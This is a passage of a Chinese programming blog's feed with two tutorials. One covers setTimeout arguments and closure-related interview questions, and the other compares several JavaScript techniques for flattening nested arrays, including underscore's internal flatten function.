rel="noopener">JS中的call、apply、bind方法</a></p><p>2、setTimeout不止两个参数</p><p>我们都知道，<code>setTimeout</code>的第一个参数是要执行的回调函数，第二个参数是延迟时间（如果省略，会由浏览器自动设置。在IE，FireFox中，第一次配可能给个很大的数字，100ms上下，往后会缩小到最小时间间隔，Safari，chrome，opera则多为10ms上下。）</p><p>其实，<code>setTimeout</code>可以传入第三个参数、第四个参数….，它们表示神马呢？其实是用来表示第一个参数（回调函数）传入的参数。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params">a, b</span>)</span>&#123;   </span><br><span class="line">  <span class="built_in">console</span>.log(a);   <span class="comment">// 3</span></span><br><span class="line">  <span class="built_in">console</span>.log(b);   <span class="comment">// 4</span></span><br><span class="line">&#125;,<span class="number">0</span>, <span class="number">3</span>, <span class="number">4</span>);</span><br></pre></td></tr></table></figure></p><h3 id="setTimeout常规面试题"><a href="#setTimeout常规面试题" class="headerlink" title="setTimeout常规面试题"></a>setTimeout常规面试题</h3><blockquote><p>重点考察setTimeout的执行顺序和闭包(JavaScript执行机制，Eventloop)</p></blockquote><p>1、问：以下函数的输出结果什么,为什么？</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fn = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">    setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(i)</span><br><span class="line">    &#125;, <span class="number">10</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">fn()</span><br></pre></td></tr></table></figure><p>答案：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 4</span></span><br><span class="line"><span class="comment">// 4</span></span><br><span class="line"><span class="comment">// 4</span></span><br><span class="line"><span class="comment">// 4</span></span><br></pre></td></tr></table></figure></p><p>相信了解过<code>setTimeout</code>的人都知道<code>setTimeout</code>执行的是一个异步代码，只有在当主线程空闲的时候才会执行异步代码，for循环进入主线程执行，<code>settimeout</code>事件进入任务队列等待主线程空闲才会执行，所以打印出来的<code>i</code>是循环结束后的结果，都为<code>4</code></p><p>2、问：以下函数的输出结果什么？</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fn = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">    setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(i)</span><br><span class="line">    &#125;, <span class="number">0</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">fn()</span><br></pre></td></tr></table></figure><p>答案同上一题,（延申：如何让setTimeout打印的结果为<code>0，1，2，3</code>呢，思路利用闭包）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1</span></span><br><span class="line"><span class="keyword">var</span> fn1 = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">    (<span class="function"><span class="keyword">function</span>(<span class="params">i</span>)</span>&#123;</span><br><span class="line">      setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(i)</span><br><span class="line">      &#125;, <span class="number">0</span>)</span><br><span class="line">    &#125;)(i)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">fn1()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2</span></span><br><span class="line"><span class="keyword">var</span> fn2 = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">    setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params">i</span>) </span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(i)</span><br><span class="line">    &#125;, <span class="number">0</span>, i)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">fn2()</span><br></pre></td></tr></table></figure><p>3、继续问：以下函数的输出结果什么？</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fn = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">var</span> t = setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params">i</span>) </span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(i)</span><br><span class="line">      <span class="comment">// console.log(t)</span></span><br><span class="line">      clearTimeout(t)</span><br><span class="line">    &#125;, <span class="number">10</span>, i)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">fn()</span><br></pre></td></tr></table></figure><p>答案：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 0</span></span><br><span class="line"><span class="comment">// 1</span></span><br><span class="line"><span class="comment">// 2</span></span><br></pre></td></tr></table></figure></p><p>为什么：这个<code>t</code>是定义在闭包外面的，也就是说<code>t</code>并没有被闭包保存，所以这里的<code>t</code>指的是最后一个循环留下来的<code>t</code>，所以最后一个<code>3</code>被清除了，没有输出。</p><p>4、还是问：以下函数输出的结果为？为什么？</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">  <span class="keyword">var</span> t = setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params">i, t</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(i)</span><br><span class="line">    <span class="built_in">console</span>.log(t)</span><br><span class="line">    clearTimeout(t)</span><br><span class="line">  &#125;, <span class="number">10</span>, i, t)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>答案：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// undefined</span></span><br><span class="line"><span class="comment">// 0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// t</span></span><br><span class="line"><span class="comment">// 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// t</span></span><br><span class="line"><span class="comment">// 2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// t</span></span><br><span class="line"><span class="comment">// 3</span></span><br></pre></td></tr></table></figure></p><p>为什么：<code>t</code>被引用到闭包里面保持起来了，每次清除的是上一次的<code>setTimeout</code>，因为初始的<code>t</code>被定义了但没值，所以为<code>undefined</code></p><p>下面一题有待研究：按理说答案应该同上的<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fn = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">var</span> t = setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params">i, t</span>) </span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(i)</span><br><span class="line">      <span class="built_in">console</span>.log(t)</span><br><span class="line">      clearTimeout(t)</span><br><span class="line">    &#125;, <span class="number">10</span>, i, t)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">fn()</span><br><span class="line"></span><br><span class="line"><span class="comment">// undefined</span></span><br><span class="line"><span class="comment">// 0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// undefined</span></span><br><span class="line"><span class="comment">// 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// t</span></span><br><span class="line"><span class="comment">// 2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// t</span></span><br><span class="line"><span class="comment">// 3</span></span><br></pre></td></tr></table></figure></p><p>5、继续问：以下函数输出的结果为？</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line">    <span class="keyword">var</span> t = setInterval(<span class="function"><span class="keyword">function</span>(<span class="params">i,t</span>)</span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(i)</span><br><span class="line">      clearInterval(t)</span><br><span class="line">    &#125;,<span class="number">10</span>,i,t);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">fn()</span><br></pre></td></tr></table></figure><p>答案：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 0,1,2,3,3,3,3,3...</span></span><br></pre></td></tr></table></figure></p><p>参考：<br><a href="http://ghmagical.com/article/page/id/H61NOVU0RZ9Y" target="_blank" rel="noopener">你应该知道的setTimeout秘密</a><br><a href="https://www.cnblogs.com/c3gen/p/6170504.html" target="_blank" rel="noopener">js同步和异步</a><br><a href="https://jayzangwill.github.io/blog/2017/03/01/Some%20of%20the%20interview%20questions%20that%20impressed%20me-1/" target="_blank" rel="noopener">几个让我印象深刻的面试题(一)</a></p></the>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;计时器&lt;code&gt;setTimeout&lt;/code&gt;是我们经常会用到的，它用于在指定的毫秒数后调用函数或计算表达式。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="Javascript" scheme="https://jiuylq.github.io/tags/Javascript/"/>
    
  </entry>
  
  <entry>
    <title>数组扁平化</title>
    <link href="https://jiuylq.github.io/2019/03/10/delayering/"/>
    <id>https://jiuylq.github.io/2019/03/10/delayering/</id>
    <published>2019-03-09T16:00:00.000Z</published>
    <updated>2019-04-07T05:23:25.353Z</updated>
    
    <content type="html"><![CDATA[<p>数组扁平化  将一个多维数组转换为一维数组；扁平化不改变原数据类型(即数组里的每个数据的类型)<br><a id="more"></a></p><the rest of contents | 余下全文><h2 id="数组扁平化"><a href="#数组扁平化" class="headerlink" title="数组扁平化"></a><font color="#00ffff">数组扁平化<font></font></font></h2><blockquote><p>数组扁平化  将一个多维数组转换为一维数组；扁平化不改变原数据类型(即数组里的每个数据的类型)</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>,[<span class="number">2</span>,<span class="number">3</span>,[<span class="number">4</span>,<span class="number">5</span>,[<span class="number">6</span>,<span class="number">7</span>]]],<span class="number">8</span>];</span><br><span class="line"><span class="comment">//扁平化之后：[1,2,3,4,5,6,7,8];</span></span><br></pre></td></tr></table></figure><p>1、递归</p><p>*<em>循环数组元素，如果还是一个数组，就递归调用该方法</em></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>,[<span class="number">2</span>,<span class="number">3</span>,[<span class="number">4</span>,<span class="number">5</span>,[<span class="number">6</span>,<span class="number">7</span>]]],<span class="number">8</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">flatten</span>(<span class="params">arr</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> result = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arr.length; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">Array</span>.isArray(arr[i]))&#123;</span><br><span class="line">            result = result.concat(flatten(arr[i]))</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            result.push(arr[i]);</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(flatten(arr))</span><br></pre></td></tr></table></figure><p>*<em>指定了depth作为扁平化的深度</em></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>,[<span class="number">2</span>,<span class="number">3</span>,[<span class="number">4</span>,<span class="number">5</span>,[<span class="number">6</span>,<span class="number">7</span>]]],<span class="number">8</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">flattenDepth</span>(<span class="params">array, depth=<span class="number">1</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> result = [];</span><br><span class="line">  array.forEach (<span class="function"><span class="params">item</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> d = depth;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">Array</span>.isArray(item) &amp;&amp; d &gt; <span class="number">0</span>)&#123;</span><br><span class="line">      result.push(...(flattenDepth(item, --d)))</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      result.push(item);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(flattenDepth(arr))</span><br><span class="line"><span class="comment">// [1, 2, 3,[4,5,[6,7]]] , 8]</span></span><br><span class="line"><span class="built_in">console</span>.log(flattenDepth(arr,<span class="number">2</span>))</span><br><span class="line"><span class="comment">//[1, 2, 3, 4, 5, [6,7], 8]</span></span><br><span class="line"><span class="built_in">console</span>.log(flattenDepth(arr,<span class="number">3</span>))</span><br><span class="line"><span class="comment">//[1, 2, 3, 4, 5, 6, 7, 8]</span></span><br></pre></td></tr></table></figure><p>2、reduce</p><p><em>既然是对数组进行处理，最终返回一个值，我们就可以考虑使用 reduce 来简化代码：</em></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>,[<span class="number">2</span>,<span class="number">3</span>,[<span class="number">4</span>,<span class="number">5</span>,[<span class="number">6</span>,<span class="number">7</span>]]],<span class="number">8</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">flatten</span>(<span class="params">arr</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> arr.reduce(<span class="function"><span class="keyword">function</span>(<span class="params">prev, next</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> prev.concat(<span class="built_in">Array</span>.isArray(next) ? flatten(next) : next)</span><br><span class="line">    &#125;, [])</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(flatten(arr));</span><br><span class="line"><span class="comment">//[1, 2, 3, 4, 5, 6, 7, 8]</span></span><br></pre></td></tr></table></figure><p>3、ES6 扩展运算符(…)</p><p><em>ES6 增加了扩展运算符，用于取出参数对象的所有可遍历属性，拷贝到当前对象之中：</em></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>,[<span class="number">2</span>,<span class="number">3</span>,[<span class="number">4</span>,<span class="number">5</span>,[<span class="number">6</span>,<span class="number">7</span>]]],<span class="number">8</span>];</span><br><span class="line"><span class="built_in">console</span>.log([].concat(...arr));</span><br><span class="line"><span class="comment">//[1, 2, 3, [4, 5, [6, 7]], 8]</span></span><br></pre></td></tr></table></figure><p><em>我们用这种方法只可以扁平一层，但是顺着这个方法一直思考，我们可以写出这样的方法：</em></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>,[<span class="number">2</span>,<span class="number">3</span>,[<span class="number">4</span>,<span class="number">5</span>,[<span class="number">6</span>,<span class="number">7</span>]]],<span class="number">8</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">flatten</span>(<span class="params">arr</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (arr.some(<span class="function"><span class="params">item</span> =&gt;</span> <span class="built_in">Array</span>.isArray(item))) &#123;</span><br><span class="line">        arr = [].concat(...arr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> arr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(flatten(arr))</span><br><span class="line"><span class="comment">//[1, 2, 3, 4, 5, 6, 7, 8]</span></span><br></pre></td></tr></table></figure><p>4、toString</p><p><em>如果数组的元素都是数字，那么我们可以考虑使用 toString 方法，因为：</em></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>,[<span class="number">2</span>,<span class="number">3</span>,[<span class="number">4</span>,<span class="number">5</span>,[<span class="number">6</span>,<span class="number">7</span>]]],<span class="number">8</span>];</span><br><span class="line">arr.toString();</span><br><span class="line"><span class="comment">// "1,2,3,4,5,6,7,8"</span></span><br></pre></td></tr></table></figure><p>调用 toString 方法，返回了一个逗号分隔的扁平的字符串，这时候我们再 split，然后转成数字不就可以实现扁平化了吗？</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>,[<span class="number">2</span>,<span class="number">3</span>,[<span class="number">4</span>,<span class="number">5</span>,[<span class="number">6</span>,<span class="number">7</span>]]],<span class="number">8</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">flatten</span>(<span class="params">arr</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> arr.toString().split(<span class="string">','</span>).map(<span class="function"><span class="keyword">function</span>(<span class="params">item</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> +item</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(flatten(arr))</span><br><span class="line"><span class="comment">//[1, 2, 3, 4, 5, 6, 7, 8]</span></span><br></pre></td></tr></table></figure><p>5、join</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>,[<span class="number">2</span>,<span class="number">3</span>,[<span class="number">4</span>,<span class="number">5</span>,[<span class="number">6</span>,<span class="number">7</span>]]],<span class="number">8</span>];</span><br><span class="line">arr.join(<span class="string">','</span>).split(<span class="string">','</span>);</span><br><span class="line"><span class="comment">//[1, 2, 3, 4, 5, 6, 7, 8]</span></span><br></pre></td></tr></table></figure><p>6、undercore</p><p><em>那么如何写一个抽象的扁平函数，来方便我们的开发呢，所有又到了我们抄袭 underscore 的时候了~</em></p><p>在这里直接给出源码和注释，但是要注意，这里的 flatten 函数并不是最终的 _.flatten，为了方便多个 API 进行调用，这里对扁平进行了更多的配置。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 数组扁平化</span></span><br><span class="line"><span class="comment"> * @param  &#123;Array&#125; input   要处理的数组</span></span><br><span class="line"><span class="comment"> * @param  &#123;boolean&#125; shallow 是否只扁平一层</span></span><br><span class="line"><span class="comment"> * @param  &#123;boolean&#125; strict  是否严格处理元素，下面有解释</span></span><br><span class="line"><span class="comment"> * @param  &#123;Array&#125; output  这是为了方便递归而传递的参数</span></span><br><span class="line"><span class="comment"> * 源码地址：https://github.com/jashkenas/underscore/blob/master/underscore.js#L528</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">flatten</span>(<span class="params">input, shallow, strict, output</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 递归使用的时候会用到output</span></span><br><span class="line">    output = output || [];</span><br><span class="line">    <span class="keyword">var</span> idx = output.length;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>, len = input.length; i &lt; len; i++) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> value = input[i];</span><br><span class="line">        <span class="comment">// 如果是数组，就进行处理</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">Array</span>.isArray(value)) &#123;</span><br><span class="line">            <span class="comment">// 如果是只扁平一层，遍历该数组，依此填入 output</span></span><br><span class="line">            <span class="keyword">if</span> (shallow) &#123;</span><br><span class="line">                <span class="keyword">var</span> j = <span class="number">0</span>, lenn = value.length;</span><br><span class="line">                <span class="keyword">while</span> (j &lt; lenn) output[idx++] = value[j++];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 如果是全部扁平就递归，传入已经处理的 output，递归中接着处理 output</span></span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                flatten(value, shallow, strict, output);</span><br><span class="line">                idx = output.length;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 不是数组，根据 strict 的值判断是跳过不处理还是放入 output</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (!strict)&#123;</span><br><span class="line">            output[idx++] = value;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> output;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解释下 strict，在代码里我们可以看出，当遍历数组元素时，如果元素不是数组，就会对 strict 取反的结果进行判断，如果设置 strict 为 true，就会跳过不进行任何处理，这意味着可以过滤非数组的元素，举个例子：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>, [<span class="number">3</span>, <span class="number">4</span>]];</span><br><span class="line"><span class="built_in">console</span>.log(flatten(arr, <span class="literal">true</span>, <span class="literal">true</span>)); <span class="comment">// [3, 4]</span></span><br></pre></td></tr></table></figure><p>那么设置 strict 到底有什么用呢？不急，我们先看下 shallow 和 strct 各种值对应的结果：</p><ul><li>shallow true + strict false ：正常扁平一层</li><li>shallow false + strict false ：正常扁平所有层</li><li>shallow true + strict true ：去掉非数组元素</li><li>shallow false + strict true ： 返回一个[]</li></ul><p>我们看看 underscore 中哪些方法调用了 flatten 这个基本函数：</p><h2 id="flatten"><a href="#flatten" class="headerlink" title="_.flatten"></a>_.flatten</h2><p>首先就是 _.flatten：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_.flatten = <span class="function"><span class="keyword">function</span>(<span class="params">array, shallow</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> flatten(array, shallow, <span class="literal">false</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在正常的扁平中，我们并不需要去掉非数组元素。</p><h2 id="union"><a href="#union" class="headerlink" title="_.union"></a>_.union</h2><p>接下来是 _.union：</p><p>该函数传入多个数组，然后返回传入的数组的并集，</p><p>举个例子：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_.union([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], [<span class="number">101</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">10</span>], [<span class="number">2</span>, <span class="number">1</span>]);</span><br><span class="line">=&gt; [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">101</span>, <span class="number">10</span>]</span><br></pre></td></tr></table></figure><p>如果传入的参数并不是数组，就会将该参数跳过：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_.union([<span 